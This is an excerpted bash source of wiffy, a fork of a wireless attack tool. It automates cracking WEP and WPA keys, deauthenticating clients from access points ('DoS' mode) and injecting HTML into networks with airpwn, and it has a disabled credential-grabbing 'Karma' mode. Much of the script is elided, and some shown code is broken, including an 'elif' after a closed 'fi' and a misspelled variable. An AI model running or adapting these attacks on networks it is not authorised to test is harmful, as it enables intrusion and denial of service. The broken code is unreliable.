...
#----------------------------------------------------------------------------------------------#
#                                                                                              #
#  wiffy v0.2.1aa - ArchAssault Fork ~ 2014-03-10                                              #
#     - Based on: wiffy.sh v0.2 (#0 BETA #6)                                                   #
#                                                                                              #
#  (C)opyright 2011 - g0tmi1k                                                                  #
#  (C)opyright 2014 - ArchAssault                                                              #
#                                                                                              #
#---Important----------------------------------------------------------------------------------#
#                                                                                              #
...
#---Config File---#
WIFFYCFG="/etc/default/wiffy"

#---Configure Wiffy---#
source "$WIFFYCFG" #Load settings from config file then set missing settings...

# [ /crack/dos/inject/karma/decode/table] What do you want to do today? #KARMA CURRENTLY DOESN'T FUNCTION BECAUSE DHCP3 SERVER NOT AVAILABLE
[[ -z "$mode" ]] && mode=" "
...
[[ -z "$macMode" ]] && macMode="random"
[[ -z "$fakeMac" ]] && fakeMac="00:05:7c:9a:58:3f"

# [/path/to/file] Location of the folder/file(s). # Can't use ~/ with "" around path.
[[ -z "$capFolder" ]] && capFolder="${PWD}/cap/" #[/path/to/file] Location of captures
[[ -z "$decodeFolder" ]] && decodeFolder="${PWD}/cap/" #[/path/to/file] Location of decodes
[[ -z "$wordlist" ]] && wordlist="/etc/pentest/wordlists/" #[/path/to/file] Location of wordlists

# [wordlist/brute] Use a existing wordlist or generate on-the-fly. [aircrack-ng/cowpatty/pyrit] Which software to use?
[[ -z "$wpaMethod" ]] && wpaMethod="wordlist"
[[ -z "$wpaSoftware" ]] && wpaSoftware="aircrack-ng"

# [true/false] Connect to network after cracking key?
[[ -z "$connect" ]] && connect="false"

# [true/false] Keep captured cap's?
[[ -z "$keepCap" ]] && keepCap="true"

# [true/false] Attempt to generate an ETA by testing the system performance.
[[ -z "$benchmark" ]] && benchmark="true"
...
[[ -z "$timeAP" ]] && timeAP="20"
[[ -z "$timeClient" ]] && timeClient="10"
[[ -z "$timeWEP" ]] && timeWEP="180"
[[ -z "$loopWPA" ]] && loopWPA="3"

#---Default Variables---#
[[ -z "$attackMethod" ]] && attackMethod="ap"       # [ap/apless/clone] Attack method
[[ -z "$crackMethod" ]] && crackMethod="online"     # [online/offline] Do we need to capture new?
[[ -z "$displayMore" ]] && displayMore="false"      # [true/false] Gives more details on what's happening
[[ -z "$diagnostics" ]] && diagnostics="false"      # [true/false] Creates a output file displays exactly what's going on
[[ -z "$quiet" ]] && quiet="false"                  # [true/false] If true, it doesn't use xterm - just uses the one output window
[[ -z "$verbose" ]] && verbose="0"                  # [0/1/2] Shows more info. 0=normal, 1=more, 2=more+commands
[[ -z "$debug" ]] && debug="false"                  # [true/false] Doesn't delete files, shows more on screen etc.
[[ -z "$logFile" ]] && logFile="/var/log/wiffy.log" # [/path/to/file] Filename of output
...
# Attack mode "$essid" $bssid $client $channel
function attack() {
    ...
    if [ "$1" == "FakeAuth" ]; then
      ...
      return 0
        ...
        if grep -q "$monitorInterface is on channel -1" "${PWD}/tmp/wiffy.tmp"; then display error "$monitorInterface doesn't support packet injecting [2]" 1>&2; fi
        else display error "Something went wrong )=   [8]" 1>&2
    fi
    return 0
}

#attackWEP "$essid" $bssid
function attackWEP() {
...
#capture $bssid $channel $totalNetwork $currentNetwork
function capture() {
    ...
    elif [ "$1" ] && [ "$2" ]; then display action "Starting: Capture" # Should be BEFORE the command, however it needs to be this way for the countdown
    #else echo -ne "\r\E[K\e[01;32m[>]\e[00m Scanning: Environment" # Had to remove it due to -V and Command printing on it
    fi
    sleep 1
    return 0
}
...
function cleanUp() {
    ...
    if [ "$1" != "remove" ]; then
        ...
        echo "Starting services (please restart your network management service manually)" "$command"
    fi
...
#DISABLE KARMA BECAUSE DHCP3 SERVER NOT AVAILABLE
...
function connect() {
    ...
    if [ -e "/usr/lib/systemd/system/wicd.service" ]; then command="systemctl start wicd 2>&1 /dev/null"
    elif [ -e "/usr/lib/systemd/NetworkManager.service" ]; then command="systemctl start NetworkManager 2>&1 /dev/null"; fi
    action "Starting services" "$command"
    sleep 1
...
#crackKey #"$essid" $bssid "$encryption"
function crackKey() {
            ...
            if [ "$3" == "WEP" ]; then
                ...
                if [ "$wpaSoftware" == "aircrack-ng" ]; then command="aircrack-ng \"$pathCap\" -b $2 -l \"${PWD}/tmp/wiffy.key\" -a 2"
                    ...
                    if [ "$wpaMethod" == "wordlist" ]; then
                        ...
                        if [ "$wpaSoftware" == "aircrack-ng" ]; then command="/etc/pentest/passwords/crunch/crunch $tmp | $command -w-"
                        elif [ "$wpaSoftware" == "cowpatty" ]; then command="/etc/pentest/passwords/crunch/crunch $tmp | $command -f- | tee \"${PWD}/tmp/wiffy.tmp\""
                        elif [ "$wpaSoftware" == "pyrit" ]; then command="/etc/pentest/passwords/crunch/crunch $tmp | $command -i- attack_passthrough"
                    fi
                ...
                else display error "Something went wrong )=   [7]" 1>&2
                fi
...
function editSettings(){
    ...
    if [ -n "$EDITOR" ]; then eval "$EDITOR" "$1"
    elif [ $(type -P gedit) ]; then eval "gedit" "$1"
    elif [ $(type -P mousepad) ]; then eval "mousepad" "$1"
    elif [ $(type -P kate) ]; then eval "kate" "$1"
    elif [ $(type -P geany) ]; then eval "geany" "$1"
    elif [ $(type -P nano) ]; then eval "nano" "$1"
    elif [ $(type -P vim) ]; then eval "vim" "$1"
    elif [ $(type -P vi) ]; then eval "vi" "$1"
    else display error "Couldn't detect a text editor. You'll have to do it manually."; fi
    return 0
}
...
function findAP() {
    ...
    while true; do
        ...
        while true; do
            ...
            else display error "Something went wrong )=   [2]" 1>&2; cleanUp
            fi
...
#findClient #"$essid" $bssid "$encryption"
function findClient() {
...
function help() {
    ...
    echo "  (C)opyright 2014 ArchAssault (http://www.archassault.org) -and- (C)opyright 2011 g0tmi1k (http://g0tmi1k.blogspot.com)"
    #echo "  Usage: ${0} -i [interface] -t [interface] -m [crack/dos/inject/karma/decode/table] -e [ESSID] -b [MAC]" #DISABLE KARMA BECAUSE DHCP3 SERVER NOT AVAILABLE
    echo "  Usage: ${0} -i [interface] -t [interface] -m [crack/dos/inject/decode/table] -e [ESSID] -b [MAC]"
    echo "         -p [wordslist/brute/rainbow] -a [aircrack-ng/cowpatty/pyrit] -w [/path/to/]"
    echo "         (-z [random/set/false] / -s [MAC]) -x -k -o [/path/to/folder/] -q -d (-v / -V) ([-u] [-?])
 ...
 Options:
    ...
    -w [/path/to/] || [/path/to/file]  ---  Path to Wordlist (file or folder) e.g. $wordlist
 ...
 Example:
    ${0}
    ${0} -i wlan1 -e Linksys -w /etc/pentest/passwords/wordlists/wpa.lst -x -v
    ${0} -i wlan1 -b 00:11:22:33:44:55 -p brute
    ${0} -m dos -V

 Modes:
    -Crack: Uses different attack styles (AP and AP-Less/CloneAP) and methods (ARPReplay, Fragment, ChopChop, Interactive) to support both WEP and WPA/WPA2 networks
    -DoS: Blocks access to the Access point to everyone or specific clients
    -Inject: Insert data into the wireless network
    -Karma: A method of grabbing user's credentials (currently disabled due to dhcp3 not being available)
    -DeCode: Converts encrypted traffic
    -Table: Creates rainbow/hash tables which can be used to speed up the cracking process
 ...
 Known issues:
    ...
    while true;  do
        ...
        elif [[ "$REPLY" =~ ^[Ww]$ ]]; then editSettings "${WIFFYCFG}"; display info "Please re-run wiffy"; break; fi
    done
    exit 1
}
...
#    elif [ "$mode" == "karma" ]; then break #DISABLE KARMA BECAUSE DHCP3 SERVER NOT AVAILABLE
...
#        elif [[ "$REPLY" =~ ^[Kk]$ ]]; then mode="karma"; break #DISABLE KARMA BECAUSE DHCP3 SERVER NOT AVAILABLE
        elif [[ "$REPLY" =~ ^[Tt]$ ]]; then mode="table"; break
        elif [[ "$REPLY" =~ ^[Ww]$ ]]; then mode="wordlist"; break
        elif [[ "$REPLY" =~ ^[Ss]$ ]]; then editSettings "${WIFFYCFG}"; display info "Please re-run wiffy"; exit
        elif [[ "$REPLY" =~ ^[Hh]$ ]]; then help
        elif [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu; fi
    done;
}

#moveCap "$essid" $bssid "$encryption"
function moveCap() {
...
#setup #"$essid" $bssid "$encryption" $channel
function setup() {
...
#checkDB #"$essid" $bssid "$encryption" #"$message"
function checkDB() {
...
if [ "$mode" != "crack" ] && [ "$mode" != "dos" ] && [ "$mode" != "inject" ] && [ "$mode" != "decode" ] && [ "$mode" != "table" ] && [ "$mode" != "wordlist" ]; then display error "mode ($mode) isn't correct" 1>&2; mainMenu; fi
...
os=$(cat /etc/*release | grep -e "^NAME=" | sed 's/^[^"]*"//g;s/"$//g')
...
#    display info "       debug=$debug"
    display info "          os=$os"
#DISABLE KARMA BECAUSE DHCP4 SERVER NOT AVAILABLE
...
if [ "$mode" == "crack" ] || [ "$mode" == "table" ]; then
    if [ "$wpaMethod" == "brute" ]; then
        if [ ! $(type -P crunch) ]; then display error "crunch isn't installed"; fi
    fi
    if [ "$wpaSoftware" == "cowpatty" ]; then
        if [ ! $(type -P cowpatty) ]; then display error "cowpatty isn't installed" 1>&2; fi
    elif [ "$wpaSoftware" == "pyrit" ]; then
        if [ ! $(type -P pyrit) ] && [ ! -e "/usr/local/bin/pyrit" ]; then display error "pyrit isn't installed" 1>&2; fi
    fi
elif [ "$mode" == "inject" ]; then
    if [ ! $(type -P airpwn) ]; then display error "airpwn isn't installed"; fi
#DISABLE KARMA BECAUSE DHCP3 SERVER NOT AVAILABLE
#elif [ "$mode" == "karma" ]; then
#    if [ ! $(type -P msfconsole) ]; then display error "Metasploit isn't installed" 1>&2; fi
#    if [ ! $(type -P dhcpd3) ]; then display error "dhcpd3 isn't installed" 1>&2; fi
fi
...
#elif [ "$mode" == "karma" ]; then mkdir -p "${PWD}/karma/"; fi #DISABLE KARMA BECAUSE DHCP3 SERVER NOT AVAILABLE

if [ "$mode" != "decode" ] && [ "$mode" != "table" ] && [ "$mode" != "wordlist" ]; then
    if [ "$displayMore" == "true" ]; then display more "Stopping: Programs"; fi
    if [ -e "/usr/systemd/system/NetworkManager.service" ]; then command="systemctl stop NetworkManager 2>/dev/null"; fi
    elif [ -e "/usr/systemd/system/wicd.service" ]; then comand="$command; systemctl stop wicd 2>/dev/null"; fi
...
if [ "$mode" == "crack" ]; then
    ...
    while true; do # Action loop
        ...
        while true; do # Menu loop
            ...
            if [ "$bssid" ]; then
                ...
                elif [ "$REPLY" == $(($loop+1)) ]; then
                    i="0"
                    for targets in "${client[@]}"; do
                        attack "DoS" "$essid" "$bssid" "$targets" "$i" & sleep 1; i=$((i+90))
                    done
                else
                    attack "DoS" "$essid" "$bssid" "${client[${id}]}" & sleep 1
                fi # Selected client

                display info "Attacking! ...press CTRL+C to stop"
                if [ "$diagnostics" == "true" ]; then
                    echo "-Ready!----------------------------------" >> $logFile; echo -e "Ready @ $(date)" >> $logFile
                fi
    ...
    if [ "$type" == "Open" ]; then
        ...
        action "AirPWN" "cd /etc/pentest/wireless/airpwn-1.4/ && ./airpwn -i $monitorInterface -d $wifiDriver -c conf/greet_html -vvv" "true" "0|0|40" & #-vvvv #-i inputCard -o outputCard
    elif [ "$type" == "WEP" ]; then
        echo $key
        key=$(echo $key | sed -e 's/[0-9A-F]\{2\}/&:/g' -e 's/:$//')
        display action "Attack (Inject): WEP Networks"
        action "AirPWN" "cd /etc/pentest/wireless/airpwn-1.4/ && ./airpwn -i $monitorInterface -d $wifiDriver -c conf/greet_html -vvv -F -k $key" "true" "0|0|40" & #-vvvv
    fi
...
# Needs work - Search the DB, search a certain folder
